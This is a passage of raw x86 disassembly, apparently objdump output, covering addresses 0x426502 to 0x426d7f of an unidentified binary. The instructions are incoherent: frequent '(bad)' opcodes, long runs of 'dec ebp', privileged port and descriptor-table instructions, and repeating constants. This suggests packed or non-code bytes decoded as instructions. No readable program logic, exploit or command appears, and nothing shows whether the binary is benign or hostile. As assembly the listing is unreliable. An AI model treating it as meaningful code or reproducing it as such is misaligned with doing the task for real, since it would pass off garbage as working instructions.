  426502:	stos   BYTE PTR es:[edi],al
  426503:	cmp    BYTE PTR [esi-0x47],0x50
  426507:	xchg   edi,eax
  426508:	push   ds
  426509:	adc    BYTE PTR [ecx+edi*4-0x121668b0],0xfb
  426511:	jle    0x4264cc
  426513:	push   eax
  426514:	xchg   edi,eax
  426515:	int    0x1
  426517:	xchg   esi,eax
  426518:	push   ebp
  426519:	add    BYTE PTR [ebp-0x1518af47],0xed
  426520:	jl     0x42659c
  426522:	mov    ecx,0x10fe750
  426527:	fistp  WORD PTR [ecx-0x47]
  42652a:	push   eax
  42652b:	out    0x4c,eax
  42652d:	mov    ecx,0xb9107750
  426532:	push   eax
  426533:	xlat   BYTE PTR ds:[ebx]
  426534:	pop    DWORD PTR [eax+0x7750b974]
  42653a:	inc    ecx
  42653b:	mov    ecx,0x4d6d1850
  426540:	dec    ebp
  426541:	dec    ebp
  426542:	in     eax,dx
  426543:	push   0x62
  426545:	mov    ecx,0x4dd84f50
  42654a:	dec    ebp
  42654b:	dec    ebp
  42654c:	add    DWORD PTR [edx+0x4f50b985],edx
  426552:	jne    0x4265a1
  426554:	dec    ebp
  426555:	dec    ebp
  426556:	in     eax,dx
  426557:	push   0xffffffd4
  426559:	mov    ecx,0x4d794f50
  42655e:	dec    ebp
  42655f:	dec    ebp
  426560:	add    DWORD PTR [edx+0x4f50b971],edx
  426566:	jge    0x4265b5
  426568:	dec    ebp
  426569:	dec    ebp
  42656a:	in     eax,dx
  42656b:	push   0xffffffc0
  42656d:	mov    ecx,0x4dda4f50
  426572:	dec    ebp
  426573:	dec    ebp
  426574:	mov    ecx,0x4d310150
  426579:	dec    ebp
  42657a:	dec    ebp
  42657b:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  426580:	mov    cl,0x4d
  426582:	dec    ebp
  426583:	dec    ebp
  426584:	xor    BYTE PTR [edi-0x79],0x80
  426588:	lock xor cl,BYTE PTR [ecx]
  42658b:	inc    esi
  42658c:	std    
  42658d:	or     al,0xb2
  42658f:	mov    esi,0x87f0800c
  426594:	adc    BYTE PTR [edi-0x385893ce],0x4
  42659b:	aam    0x53
  42659d:	jl     0x4265f2
  42659f:	jb     0x426553
  4265a1:	mov    edx,0xc4fbff29
  4265a6:	xchg   edx,eax
  4265a7:	add    ebp,edx
  4265a9:	ja     0x426605
  4265ab:	mov    ecx,0x5c09a180
  4265b0:	sbb    DWORD PTR [ecx],ecx
  4265b2:	pop    esp
  4265b3:	jo     0x426608
  4265b5:	adc    DWORD PTR [edx-0x72c7163e],esp
  4265bb:	lea    esi,[esi+0x9bab207]
  4265c1:	(bad)  
  4265c2:	(bad)  
  4265c3:	adc    BYTE PTR [ecx+0x2f],al
  4265c6:	or     DWORD PTR ds:0xf0804d4d,0xfffffff9
  4265cd:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  4265d4:	mov    dl,0x7
  4265d6:	or     al,0x80
  4265d8:	xchg   edi,eax
  4265d9:	stc    
  4265da:	adc    bh,0x86
  4265dd:	push   ebx
  4265de:	sub    dl,BYTE PTR [ebx+0xb]
  4265e1:	call   DWORD PTR [ecx-0x4e]
  4265e4:	clc    
  4265e5:	sub    esp,ebp
  4265e7:	mov    dl,0xed
  4265e9:	mov    ebp,DWORD PTR [edi-0x29]
  4265ec:	icebp  
  4265ed:	xor    BYTE PTR [edi-0x79],0x80
  4265f1:	lock xor cl,BYTE PTR [ecx]
  4265f4:	inc    esi
  4265f5:	std    
  4265f6:	or     al,0xb2
  4265f8:	mov    esi,0x87f0800c
  4265fd:	adc    BYTE PTR [edi+0x537c5332],0x72
  426604:	mov    dl,0xba
  426606:	sub    edi,edi
  426608:	sti    
  426609:	les    edx,FWORD PTR [edx-0x32882aff]
  42660f:	mov    ecx,0x5c09a180
  426614:	sbb    DWORD PTR [ecx],ecx
  426616:	pop    esp
  426617:	jo     0x42666c
  426619:	adc    DWORD PTR [edx-0x72c7163e],esp
  42661f:	lea    esi,[esi+0x9bab207]
  426625:	(bad)  
  426626:	(bad)  
  426627:	adc    BYTE PTR [ecx+0x2f],al
  42662a:	inc    ecx
  42662b:	or     eax,0xf0804d4d
  426630:	stc    
  426631:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  426638:	mov    dl,0x7
  42663a:	or     al,0x80
  42663c:	xchg   edi,eax
  42663d:	stc    
  42663e:	adc    bh,0x86
  426641:	push   ebx
  426642:	sub    dl,BYTE PTR [ebx+0xb]
  426645:	call   DWORD PTR [ecx-0x4e]
  426648:	clc    
  426649:	sub    esp,ebp
  42664b:	mov    dl,0xed
  42664d:	mov    ecx,DWORD PTR [edi+edx*8-0x78887f0f]
  426654:	xor    al,0x32
  426657:	or     DWORD PTR [esi-0x3],eax
  42665a:	or     al,0xb2
  42665c:	mov    esi,0x87f0800c
  426661:	adc    BYTE PTR [edi+0x537c5332],0x72
  426668:	mov    dl,0xba
  42666a:	sub    edi,edi
  42666c:	sti    
  42666d:	les    esi,FWORD PTR [ebp+0x1]
  426670:	push   esi
  426671:	ja     0x4266e0
  426673:	dec    ebp
  426674:	dec    ebp
  426675:	dec    ebp
  426676:	mov    ecx,0x5c09a180
  42667b:	sbb    DWORD PTR [ecx],ecx
  42667d:	pop    esp
  42667e:	jo     0x4266d3
  426680:	adc    DWORD PTR [edx-0x72c7163e],esp
  426686:	lea    esi,[esi+0x9bab207]
  42668c:	(bad)  
  42668d:	(bad)  
  42668e:	adc    BYTE PTR [ecx+0x2f],al
  426691:	prefetchw BYTE PTR [ebp+0x4d]
  426695:	xor    al,0xf9
  426698:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  42669f:	mov    dl,0x7
  4266a1:	or     al,0x80
  4266a3:	xchg   edi,eax
  4266a4:	stc    
  4266a5:	adc    bh,0x86
  4266a8:	push   ebx
  4266a9:	sub    dl,BYTE PTR [ebx+0xb]
  4266ac:	call   DWORD PTR [ecx-0x4e]
  4266af:	clc    
  4266b0:	sub    esp,ebp
  4266b2:	mov    dl,0xed
  4266b4:	mov    ebp,edi
  4266b6:	xlat   BYTE PTR ds:[ebx]
  4266b7:	pop    esp
  4266b8:	add    DWORD PTR [edi-0x7],ecx
  4266bb:	or     eax,0x77504d4d
  4266c0:	mov    eax,DWORD PTR [eax+0x49608b77]
  4266c6:	cmp    eax,0xef50d146
  4266cb:	icebp  
  4266cc:	outs   dx,BYTE PTR ds:[esi]
  4266cd:	sub    ecx,DWORD PTR [ebx]
  4266cf:	sub    BYTE PTR [eax+0xa],dl
  4266d2:	out    dx,al
  4266d3:	or     BYTE PTR [edi-0x7],0xd
  4266d7:	dec    ebp
  4266d8:	dec    ebp
  4266d9:	sbb    BYTE PTR [eax-0x7a],0xd
  4266dd:	dec    ebp
  4266de:	dec    ebp
  4266df:	push   eax
  4266e0:	xlat   BYTE PTR ds:[ebx]
  4266e1:	xchg   dl,bh
  4266e3:	and    ah,BYTE PTR [edi+ebp*2]
  4266e6:	cmp    BYTE PTR [ebx-0x4e],ah
  4266e9:	or     DWORD PTR [edi-0x2a],ecx
  4266ec:	cmp    cl,BYTE PTR [ebp-0x7968a073]
  4266f2:	or     DWORD PTR [edi+0x6e],ecx
  4266f5:	cmp    cl,BYTE PTR [ebp+0x38305e8d]
  4266fb:	lea    ecx,[ebp-0x74b0af47]
  426701:	or     eax,0x74804d4d
  426706:	mov    ecx,0xd854f50
  42670b:	dec    ebp
  42670c:	dec    ebp
  42670d:	pop    esi
  42670e:	daa    
  42670f:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426715:	mov    cl,BYTE PTR ds:0x2c5e4d4d
  42671b:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426721:	or     eax,0x5e4d4d0d
  426726:	pop    ds
  426727:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  42672d:	lea    ecx,[ebp+0x4d]
  426730:	dec    ebp
  426731:	in     eax,dx
  426732:	push   0xffffffe8
  426734:	cmp    ch,0xb9
  426737:	push   eax
  426738:	add    DWORD PTR [ecx*2+0x77804d4d],ecx
  42673f:	jno    0x4267a1
  426741:	jae    0x42677b
  426743:	lea    ecx,[ebp-0x11feaf47]
  426749:	dec    ebp
  42674a:	dec    ebp
  42674b:	dec    ebp
  42674c:	in     eax,dx
  42674d:	mov    dl,0xaa
  42674f:	mov    ecx,0x4d6f0150
  426754:	dec    ebp
  426755:	dec    ebp
  426756:	pusha  
  426757:	push   edi
  426758:	cmp    BYTE PTR [ebp+0x150b98d],cl
  42675e:	out    dx,eax
  42675f:	dec    ebp
  426760:	dec    ebp
  426761:	dec    ebp
  426762:	in     eax,dx
  426763:	mov    dl,0x9d
  426765:	mov    ecx,0x4da60150
  42676a:	dec    ebp
  42676b:	dec    ebp
  42676c:	adc    BYTE PTR [ecx],0xb9
  42676f:	push   eax
  426770:	add    DWORD PTR [ecx],esp
  426772:	dec    ebp
  426773:	dec    ebp
  426774:	dec    ebp
  426775:	pusha  
  426776:	in     eax,dx
  426777:	cmp    BYTE PTR [ebp+0x150b98d],cl
  42677d:	mov    eax,ds:0x534d4d4d
  426782:	cld    
  426783:	pusha  
  426784:	xor    ch,BYTE PTR [esi-0x73]
  426787:	lea    edi,[ecx+0x4d710150]
  42678d:	dec    ebp
  42678e:	dec    ebp
  42678f:	mov    dl,0x86
  426791:	or     al,0x60
  426793:	sbb    ebx,DWORD PTR [eax]
  426795:	lea    ecx,[ebp-0x6ffeaf47]
  42679b:	dec    ebp
  42679c:	dec    ebp
  42679d:	dec    ebp
  42679e:	pusha  
  42679f:	fwait
  4267a0:	xchg   BYTE PTR [ebp+0x150b98d],cl
  4267a6:	adc    eax,0x804d4d4d
  4267ab:	lock jno 0x42679b
  4267ae:	add    eax,0x29bab20d
  4267b3:	push   DWORD PTR [edx+0xd164f50]
  4267b9:	dec    ebp
  4267ba:	dec    ebp
  4267bb:	xor    BYTE PTR [edi+0x21],0x80
  4267bf:	lock and DWORD PTR [ebx-0x4],edx
  4267c3:	mov    dl,0x86
  4267c5:	or     al,0xed
  4267c7:	add    eax,0x29bab20d
  4267cc:	push   DWORD PTR [edx+0x1e4f0f7c]
  4267d2:	or     eax,0x4d4d4d4d
  4267d7:	lea    ecx,[ebp+0xd164f01]
  4267dd:	dec    ebp
  4267de:	dec    ebp
  4267df:	or     al,BYTE PTR [eax-0xf7f8e89]
  4267e5:	jno    0x42683a
  4267e7:	cld    
  4267e8:	mov    dl,0x86
  4267ea:	or     al,0xed
  4267ec:	add    eax,0x29bab20d
  4267f1:	push   DWORD PTR [edx-0x74b0fef6]
  4267f7:	or     eax,0x800a4d4d
  4267fc:	ja     0x4267c6
  4267fe:	or     ch,0x3e
  426801:	cmp    cl,BYTE PTR [ebp+0x194f7c8d]
  426807:	dec    ebp
  426808:	dec    ebp
  426809:	dec    ebp
  42680a:	sar    ch,cl
  42680c:	sbb    al,0x38
  42680e:	dec    ebp
  42680f:	add    DWORD PTR [eax-0x8b2ea89],0x808b7750
  426819:	ja     0x4267a6
  42681b:	dec    edi
  42681c:	push   0xffffffd5
  42681e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42681f:	mov    ds:0x1d4c6957,al
  426824:	in     eax,dx
  426825:	fstp   st(0)
  426827:	mov    esp,0x21f08076
  42682c:	adc    BYTE PTR [edi+0x530de221],0x51
  426833:	popf   
  426834:	push   ebx
  426835:	div    DWORD PTR [edx-0x414dd608]
  42683b:	or     al,0xff
  42683d:	inc    BYTE PTR [eax-0x2e7f3769]
  426843:	cmp    cl,BYTE PTR es:[ebp+0x9a65f8d]
  42684a:	dec    edi
  42684b:	push   0x808d8d2f
  426850:	lock and DWORD PTR [eax+0x51532197],eax
  426857:	mov    dl,0xbe
  426859:	or     al,0x53
  42685b:	div    DWORD PTR [edx-0x100d608]
  426861:	adc    BYTE PTR [edi-0x1a2e7f38],0x3a
  426868:	lea    ecx,[ebp-0xf7f59b0]
  42686e:	and    DWORD PTR [eax+0x51532197],eax
  426874:	mov    dl,0xbe
  426876:	or     al,0x53
  426878:	div    DWORD PTR [edx-0x100d608]
  42687e:	adc    BYTE PTR [edi-0x322e7f38],0x3a
  426885:	lea    ecx,[ebp+0x6760a650]
  42688b:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426891:	and    eax,0x804d4d4d
  426896:	adc    DWORD PTR [ecx+0x4d290150],edi
  42689c:	dec    ebp
  42689d:	dec    ebp
  42689e:	pusha  
  42689f:	daa    
  4268a0:	cmp    BYTE PTR [ebp+0x150b98d],cl
  4268a6:	sub    eax,0x604d4d4d
  4268ab:	sub    BYTE PTR [eax],bh
  4268ad:	lea    ecx,[ebp-0x3ffeaf47]
  4268b3:	dec    ebp
  4268b4:	dec    ebp
  4268b5:	dec    ebp
  4268b6:	in     eax,dx
  4268b7:	mov    dl,0x4
  4268b9:	mov    ecx,0x4d350150
  4268be:	dec    ebp
  4268bf:	dec    ebp
  4268c0:	pusha  
  4268c1:	adc    al,0x38
  4268c3:	lea    ecx,[ebp+0x390150b9]
  4268c9:	dec    ebp
  4268ca:	dec    ebp
  4268cb:	dec    ebp
  4268cc:	in     eax,dx
  4268cd:	mov    dl,0xf3
  4268cf:	mov    ecx,0x4d3d0150
  4268d4:	dec    ebp
  4268d5:	dec    ebp
  4268d6:	pusha  
  4268d7:	sbb    al,0x38
  4268d9:	lea    ecx,[ebp-0x2dfeaf47]
  4268df:	dec    ebp
  4268e0:	dec    ebp
  4268e1:	dec    ebp
  4268e2:	adc    BYTE PTR [ecx],0xb9
  4268e5:	push   eax
  4268e6:	add    DWORD PTR [ebp+0x4d],eax
  4268e9:	dec    ebp
  4268ea:	dec    ebp
  4268eb:	pusha  
  4268ec:	sbb    BYTE PTR [eax],bh
  4268ee:	lea    ecx,[ebp+0x490150b9]
  4268f4:	dec    ebp
  4268f5:	dec    ebp
  4268f6:	dec    ebp
  4268f7:	pusha  
  4268f8:	daa    
  4268f9:	pop    ebp
  4268fa:	lea    ecx,[ebp-0x7efeaf47]
  426900:	dec    ebp
  426901:	dec    ebp
  426902:	dec    ebp
  426903:	pusha  
  426904:	push   ebx
  426905:	xor    ecx,DWORD PTR [ebp+0x150b98d]
  42690b:	aam    0x4d
  42690d:	dec    ebp
  42690e:	dec    ebp
  42690f:	cld    
  426910:	ja     0x426895
  426912:	mov    ds:0x8d185d60,eax
  426917:	lea    edi,[ecx+0x4d550150]
  42691d:	dec    ebp
  42691e:	dec    ebp
  42691f:	in     eax,dx
  426920:	mov    dl,0x5d
  426922:	mov    ecx,0x4d590150
  426927:	dec    ebp
  426928:	dec    ebp
  426929:	cld    
  42692a:	ja     0x4268d4
  42692c:	or     bh,ah
  42692e:	ja     0x426934
  426930:	xchg   ebp,eax
  426931:	cld    
  426932:	ja     0x4268e0
  426934:	stos   DWORD PTR es:[edi],eax
  426935:	pusha  
  426936:	(bad)  
  426938:	lea    ecx,[ebp+0x5d0150b9]
  42693e:	dec    ebp
  42693f:	dec    ebp
  426940:	dec    ebp
  426941:	cld    
  426942:	ja     0x4268c8
  426944:	jg     0x4269a6
  426946:	fistp  DWORD PTR [eax-0x73]
  426949:	lea    edi,[ecx+0x4dd60150]
  42694f:	dec    ebp
  426950:	dec    ebp
  426951:	cld    
  426952:	ja     0x42690e
  426954:	popf   
  426955:	cld    
  426956:	ja     0x426950
  426958:	xchg   esi,eax
  426959:	pusha  
  42695a:	inc    edx
  42695b:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426961:	gs dec ebp
  426963:	dec    ebp
  426964:	dec    ebp
  426965:	cld    
  426966:	ja     0x42691c
  426968:	xchg   BYTE PTR [eax-0x687f8e10],al
  42696e:	jno    0x4269c3
  426970:	push   ecx
  426971:	push   ebx
  426972:	div    DWORD PTR [edx-0x74df342]
  426978:	sub    edi,edi
  42697a:	inc    ah
  42697c:	fwait
  42697d:	adc    BYTE PTR [edi+0x71e78071],0x53
  426984:	jle    0x426938
  426986:	pop    es
  426987:	or     al,0x53
  426989:	mov    esi,DWORD PTR [edx-0x6300d644]
  42698f:	inc    ebx
  426990:	dec    BYTE PTR [ecx]
  426992:	loopne 0x4269c5
  426994:	iret   
  426995:	add    DWORD PTR [eax-0x187f8e69],0x71
  42699c:	push   ebx
  42699d:	jle    0x426951
  42699f:	pop    es
  4269a0:	or     al,0x53
  4269a2:	mov    esi,DWORD PTR [edx-0x6300d644]
  4269a8:	and    bh,0x8b
  4269ab:	mov    ds:0x8d8dcd05,al
  4269b0:	lea    esp,[edx-0x7272e14e]
  4269b6:	lea    eax,[ebx-0x7b]
  4269b9:	adc    BYTE PTR [ecx],dh
  4269bb:	add    DWORD PTR [bx+si+0x7197],0xffffff80
  4269c1:	lock jno 0x426a17
  4269c4:	jle    0x426a19
  4269c6:	std    
  4269c7:	mov    dl,0xba
  4269c9:	sub    DWORD PTR [edx-0x4900f3f9],esi
  4269cf:	xor    al,0x8b
  4269d2:	in     al,dx
  4269d3:	inc    BYTE PTR [eax-0x187f8e69]
  4269d9:	jno    0x426a2e
  4269db:	jle    0x426a30
  4269dd:	mov    esi,DWORD PTR [edx-0x434df3f9]
  4269e3:	sub    edi,edi
  4269e5:	pushf  
  4269e6:	in     eax,dx
  4269e7:	sti    
  4269e8:	out    dx,eax
  4269e9:	push   eax
  4269ea:	lock mov esp,DWORD PTR [ebx-0x2]
  4269ee:	in     al,0x1
  4269f0:	xor    al,0x71
  4269f3:	adc    BYTE PTR [edi+0x53515371],0xf7
  4269fa:	mov    dl,0xbe
  4269fc:	or     al,0xb2
  4269fe:	clc    
  4269ff:	sub    edi,edi
  426a01:	(bad)  
  426a02:	push   eax
  426a03:	add    DWORD PTR [esi],edx
  426a05:	or     eax,0xf0804d4d
  426a0a:	and    DWORD PTR [eax+0x51532197],eax
  426a10:	push   ebx
  426a11:	div    DWORD PTR [edx-0x414dd608]
  426a17:	or     al,0xff
  426a19:	inc    BYTE PTR [ecx]
  426a1b:	xchg   edi,eax
  426a1c:	adc    DWORD PTR [eax+0x16],0x1
  426a20:	push   ds
  426a21:	or     eax,0xb3f14d4d
  426a26:	cmp    BYTE PTR [ebp-0x46017f73],cl
  426a2c:	push   eax
  426a2d:	lock es in eax,dx
  426a30:	mov    dl,0xfb
  426a32:	or     bl,0xb9
  426a35:	push   eax
  426a36:	out    0xf2,eax
  426a38:	add    esi,esp
  426a3a:	add    al,0xb9
  426a3c:	push   eax
  426a3d:	out    0x2e,eax
  426a3f:	in     eax,dx
  426a40:	jl     0x426a30
  426a42:	mov    ecx,0x1f3e750
  426a47:	out    0x15,al
  426a49:	mov    ecx,0xed36e750
  426a4e:	jl     0x426a53
  426a50:	mov    ecx,0x80f4e750
  426a55:	retf   
  426a56:	mov    ecx,0x803ee750
  426a5b:	test   DWORD PTR [ecx-0x7f0a18b0],edi
  426a61:	push   es
  426a62:	mov    ecx,0x8046e750
  426a67:	test   DWORD PTR [ecx-0x7f9d18b0],edi
  426a6d:	retf   
  426a6e:	mov    ecx,0x1dee750
  426a73:	out    0xf2,al
  426a75:	mov    ecx,0xed56e750
  426a7a:	jl     0x426a6a
  426a7c:	mov    ecx,0x1e0e750
  426a81:	out    0x7a,al
  426a83:	mov    ecx,0xed5ee750
  426a88:	jl     0x426a8d
  426a8a:	mov    ecx,0xb9f1e750
  426a8f:	push   eax
  426a90:	lock mov cx,0x9750
  426a95:	cli    
  426a96:	adc    BYTE PTR [ecx],0xb9
  426a99:	push   eax
  426a9a:	lock push 0xffffff80
  426a9d:	lock and DWORD PTR [eax-0x8acde69],eax
  426aa4:	push   ebx
  426aa5:	push   ecx
  426aa6:	mov    dl,0xf8
  426aa8:	sub    DWORD PTR [edx-0x100f342],esi
  426aae:	adc    BYTE PTR [edi+0x21e78021],0x53
  426ab5:	jle    0x426a69
  426ab7:	pop    es
  426ab8:	or     al,0x1
  426aba:	xor    eax,esi
  426abc:	bound  edx,QWORD PTR [ebx-0x75]
  426abf:	mov    dl,0xbc
  426ac1:	sub    edi,edi
  426ac3:	pushf  
  426ac4:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426ac8:	pushf  
  426ac9:	mov    ecx,0xf0800e50
  426ace:	and    DWORD PTR [eax+0x51532197],eax
  426ad4:	push   ebx
  426ad5:	div    DWORD PTR [edx-0x74df342]
  426adb:	sub    edi,edi
  426add:	inc    BYTE PTR [eax+0x31012197]
  426ae3:	lock es push ebx
  426ae6:	jle    0x426a68
  426ae8:	out    0x21,eax
  426aea:	mov    dl,0x7
  426aec:	or     al,0x53
  426aee:	mov    esi,DWORD PTR [edx-0x6300d644]
  426af4:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426af8:	pushf  
  426af9:	mov    ecx,0xf0800e50
  426afe:	and    DWORD PTR [eax-0x8acde69],eax
  426b04:	mov    dl,0xf8
  426b06:	sub    DWORD PTR [ebx+0x51],edx
  426b09:	mov    dl,0xbe
  426b0b:	or     al,0xff
  426b0d:	inc    BYTE PTR [eax-0x187fde69]
  426b13:	and    DWORD PTR [ebx+0x7e],edx
  426b16:	mov    dl,0x7
  426b18:	or     al,0x53
  426b1a:	mov    esi,DWORD PTR [edx-0x6300d644]
  426b20:	mov    ecx,0x52974150
  426b25:	or     eax,0xf0804d4d
  426b2a:	and    DWORD PTR [eax-0x8acde69],eax
  426b30:	mov    dl,0xf8
  426b32:	sub    DWORD PTR [ebx+0x51],edx
  426b35:	mov    dl,0xbe
  426b37:	or     al,0xff
  426b39:	inc    BYTE PTR [eax-0x187fde69]
  426b3f:	and    DWORD PTR [ebx+0x7e],edx
  426b42:	mov    dl,0x7
  426b44:	or     al,0x53
  426b46:	mov    esi,DWORD PTR [edx-0x6300d644]
  426b4c:	mov    ecx,0xa5974150
  426b51:	or     eax,0xf0804d4d
  426b56:	jno    0x426ad8
  426b58:	xchg   edi,eax
  426b59:	jno    0x426bae
  426b5b:	not    DWORD PTR [ebx+0x51]
  426b5e:	mov    dl,0xf8
  426b60:	sub    DWORD PTR [edx-0x100f342],esi
  426b66:	adc    BYTE PTR [edi+0x71e78071],0x53
  426b6d:	jle    0x426bc2
  426b6f:	mov    esi,DWORD PTR [edx-0x434df3f9]
  426b75:	sub    edi,edi
  426b77:	pushf  
  426b78:	in     al,dx
  426b79:	(bad)  
  426b7a:	push   eax
  426b7b:	add    DWORD PTR [esi],edx
  426b7d:	or     eax,0xf0804d4d
  426b82:	and    DWORD PTR [eax-0x187fde69],eax
  426b88:	out    dx,eax
  426b89:	push   ebx
  426b8a:	not    DWORD PTR [ebx+0x51]
  426b8d:	mov    dl,0xbe
  426b8f:	or     al,0xb2
  426b91:	clc    
  426b92:	sub    edi,edi
  426b94:	inc    BYTE PTR [ecx]
  426b96:	dec    edi
  426b97:	push   edx
  426b98:	or     eax,0xf504d4d
  426b9d:	add    DWORD PTR [esi],ebx
  426b9f:	or     eax,0x77014d4d
  426ba4:	bound  eax,QWORD PTR [esi+0x4d4d61d3]
  426baa:	xor    al,0x71
  426bad:	adc    BYTE PTR [edi+0x530de271],0x51
  426bb4:	stos   DWORD PTR es:[edi],eax
  426bb5:	push   ebx
  426bb6:	pushf  
  426bb7:	mov    dl,0xbe
  426bb9:	or     al,0xb2
  426bbb:	clc    
  426bbc:	sub    edi,edi
  426bbe:	(bad)  
  426bbf:	push   eax
  426bc0:	lidtd  [esi]
  426bc3:	or     eax,0x77804d4d
  426bc8:	and    DWORD PTR [eax-0x3acde10],eax
  426bce:	mov    dl,0x86
  426bd0:	or     al,0x53
  426bd2:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426bd8:	aad    0x3d
  426bda:	add    DWORD PTR [edi+0x16],ecx
  426bdd:	or     eax,0x800a4d4d
  426be2:	ja     0x426c55
  426be4:	xor    al,0x71
  426be7:	push   ebx
  426be8:	cld    
  426be9:	mov    dl,0x86
  426beb:	or     al,0x53
  426bed:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426bf3:	or     al,BYTE PTR [ecx]
  426bf5:	dec    edi
  426bf6:	and    eax,0xa4d4d4d
  426bfb:	xor    BYTE PTR [edi+0x15],0xe2
  426bff:	lea    ecx,[ebp-0x9]
  426c02:	xor    BYTE PTR [edi+0x21],0x80
  426c06:	lock and DWORD PTR [ebx-0x4],edx
  426c0a:	push   ebx
  426c0b:	sub    al,BYTE PTR [eax-0x794d1019]
  426c11:	or     al,0xb2
  426c13:	mov    edx,0x1b2ff29
  426c18:	add    DWORD PTR [ebp+0x504d4d0d],esp
  426c1e:	inc    ecx
  426c1f:	dec    edi
  426c20:	push   ds
  426c21:	or     eax,0x77014d4d
  426c26:	xchg   BYTE PTR es:0x804d4d88,al
  426c2d:	lock jno 0x426bb0
  426c30:	xchg   edi,eax
  426c31:	jno    0x426c86
  426c33:	push   ecx
  426c34:	mov    dl,0xbe
  426c36:	or     al,0xed
  426c38:	ret    0xb20d
  426c3b:	clc    
  426c3c:	sub    edi,edi
  426c3e:	(bad)  
  426c3f:	push   eax
  426c40:	lidtd  [esi]
  426c43:	or     eax,0x33f14d4d
  426c48:	cmp    BYTE PTR [ebp+0x386b5e8d],cl
  426c4e:	lea    ecx,[ebp+0xa4f50b9]
  426c54:	dec    ebp
  426c55:	dec    ebp
  426c56:	dec    ebp
  426c57:	add    edx,ebx
  426c59:	jno    0x426c14
  426c5b:	push   eax
  426c5c:	add    DWORD PTR [ebp+0x5e4d4d4d],esi
  426c62:	popa   
  426c63:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426c69:	stos   BYTE PTR es:[edi],al
  426c6a:	dec    ebp
  426c6b:	dec    ebp
  426c6c:	dec    ebp
  426c6d:	cmp    bl,0xb9
  426c70:	push   eax
  426c71:	dec    edi
  426c72:	xchg   ebp,eax
  426c73:	dec    ebp
  426c74:	dec    ebp
  426c75:	dec    ebp
  426c76:	xor    BYTE PTR [edx-0x66b0af47],0x4d
  426c7d:	dec    ebp
  426c7e:	dec    ebp
  426c7f:	in     eax,dx
  426c80:	push   0x29
  426c82:	cmp    ch,0xb9
  426c85:	push   eax
  426c86:	add    DWORD PTR [ecx+0x14d4d4d],edi
  426c8c:	fisubr DWORD PTR [ecx]
  426c8e:	mov    ecx,0x4dbd0150
  426c93:	dec    ebp
  426c94:	dec    ebp
  426c95:	in     eax,dx
  426c96:	mov    dl,0xd6
  426c98:	mov    ecx,0x4de20150
  426c9d:	dec    ebp
  426c9e:	dec    ebp
  426c9f:	add    edx,ebx
  426ca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ca2:	mov    ecx,0x4dc50150
  426ca7:	dec    ebp
  426ca8:	dec    ebp
  426ca9:	or     BYTE PTR [ebx-0x6297af47],0x4d
  426cb0:	dec    ebp
  426cb1:	dec    ebp
  426cb2:	add    esi,esp
  426cb4:	scas   al,BYTE PTR es:[edi]
  426cb5:	pusha  
  426cb6:	dec    ebp
  426cb7:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426cbd:	ror    DWORD PTR [ebp+0x4d],0x4d
  426cc1:	add    edx,ebx
  426cc3:	or     eax,0x520150b9
  426cc8:	dec    ebp
  426cc9:	dec    ebp
  426cca:	dec    ebp
  426ccb:	mov    ecx,0x4dae6850
  426cd0:	dec    ebp
  426cd1:	dec    ebp
  426cd2:	in     eax,dx
  426cd3:	jl     0x426c60
  426cd5:	mov    ecx,0x4da56850
  426cda:	dec    ebp
  426cdb:	dec    ebp
  426cdc:	or     BYTE PTR [ebx-0x72c783a0],0x8d
  426ce3:	mov    ecx,0x4de40150
  426ce8:	dec    ebp
  426ce9:	dec    ebp
  426cea:	cmp    ch,0xb9
  426ced:	push   eax
  426cee:	add    ebp,edx
  426cf0:	dec    ebp
  426cf1:	dec    ebp
  426cf2:	dec    ebp
  426cf3:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  426cf8:	out    0x4d,al
  426cfa:	dec    ebp
  426cfb:	dec    ebp
  426cfc:	push   ebx
  426cfd:	push   0xffffffb9
  426cff:	push   eax
  426d00:	push   0x4d4d4da9
  426d05:	add    DWORD PTR [eax-0x1b],ebp
  426d08:	dec    ebp
  426d09:	dec    ebp
  426d0a:	dec    ebp
  426d0b:	jl     0x426d5c
  426d0d:	lods   eax,DWORD PTR ds:[esi]
  426d0e:	dec    ebp
  426d0f:	dec    ebp
  426d10:	dec    ebp
  426d11:	out    0x38,eax
  426d13:	xor    edi,DWORD PTR [eax]
  426d15:	jl     0x426d66
  426d17:	(bad)  [ebp+0x4d]
  426d1a:	dec    ebp
  426d1b:	ret    
  426d1c:	cmp    BYTE PTR [esi-0x7fbb46c8],dl
  426d22:	ja     0x426d95
  426d24:	xor    al,0x71
  426d27:	adc    BYTE PTR [edi+0xd05ed71],0xb2
  426d2e:	mov    edx,0xb2fc5329
  426d33:	xchg   BYTE PTR [edi+edi*8],cl
  426d36:	mov    dl,0x80
  426d38:	lock jno 0x426d28
  426d3b:	add    eax,0xb27e530d
  426d40:	mov    edx,0xc07b229
  426d45:	push   DWORD PTR [esi-0x4128fad]
  426d4b:	sbb    edx,DWORD PTR [ebx]
  426d4d:	jo     0x426da2
  426d4f:	dec    ebp
  426d50:	arpl   bx,cx
  426d52:	or     esi,ecx
  426d54:	and    cl,BYTE PTR [ebp-0x101b7273]
  426d5a:	arpl   bx,di
  426d5c:	or     ebp,ebp
  426d5e:	cmp    BYTE PTR [ebp-0xf7f7273],cl
  426d64:	jno    0x426ce6
  426d66:	xchg   edi,eax
  426d67:	jno    0x426dbc
  426d69:	push   ecx
  426d6a:	mov    dl,0xbe
  426d6c:	or     al,0xed
  426d6e:	ret    0xb20d
  426d71:	clc    
  426d72:	sub    edi,edi
  426d74:	(bad)  
  426d75:	in     al,dx
  426d76:	std    
  426d77:	adc    BYTE PTR [ecx+edi*4+0xaf01653],0x4d
  426d7f:	dec    ebp
